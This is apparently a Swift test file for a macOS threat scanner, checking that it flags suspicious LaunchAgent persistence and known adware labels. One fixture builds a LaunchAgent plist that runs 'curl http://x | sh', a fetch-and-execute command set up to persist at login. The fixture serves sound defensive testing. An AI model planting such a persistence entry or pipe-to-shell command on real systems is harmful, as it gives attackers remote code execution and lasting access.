import Testing
import Foundation
@testable import DestroyerCore

@Suite("ThreatScanner — persistenza sospetta")
struct ThreatScannerTests {

    private func makeHome(_ body: (URL) -> Void) {
        let fm = FileManager.default
        let home = fm.temporaryDirectory.appendingPathComponent("dzt-\(UUID().uuidString)", isDirectory: true)
        defer { try? fm.removeItem(at: home) }
        let la = home.appendingPathComponent("Library/LaunchAgents", isDirectory: true)
        try? fm.createDirectory(at: la, withIntermediateDirectories: true)
        body(home)
    }

    @Test func flagsMaliciousLaunchAgent() {
        makeHome { home in
            let la = home.appendingPathComponent("Library/LaunchAgents")
            let evil: [String: Any] = [
                "Label": "com.evil.persist",
                "ProgramArguments": ["/bin/sh", "-c", "curl http://x | sh"]
            ]
            (evil as NSDictionary).write(to: la.appendingPathComponent("com.evil.persist.plist"), atomically: true)

            let findings = ThreatScanner(home: home).scan()
            let evilFinding = findings.first { $0.itemURL.lastPathComponent == "com.evil.persist.plist" }
            #expect(evilFinding != nil)
            #expect(evilFinding?.severity == .high)
        }
    }

    @Test func doesNotFlagSignedSystemBinary() {
        makeHome { home in
            let la = home.appendingPathComponent("Library/LaunchAgents")
            let good: [String: Any] = ["Label": "com.good.tool", "Program": "/bin/ls"]
            (good as NSDictionary).write(to: la.appendingPathComponent("com.good.tool.plist"), atomically: true)

            let findings = ThreatScanner(home: home).scan()
            #expect(!findings.contains { $0.itemURL.lastPathComponent == "com.good.tool.plist" })
        }
    }

    @Test func knownAdwareIndicatorMatches() {
        #expect(KnownAdwareIndicators.match(label: "com.genieo.helper", path: nil) != nil)
        #expect(KnownAdwareIndicators.match(label: "com.apple.safe", path: "/usr/bin/legit") == nil)
    }
}
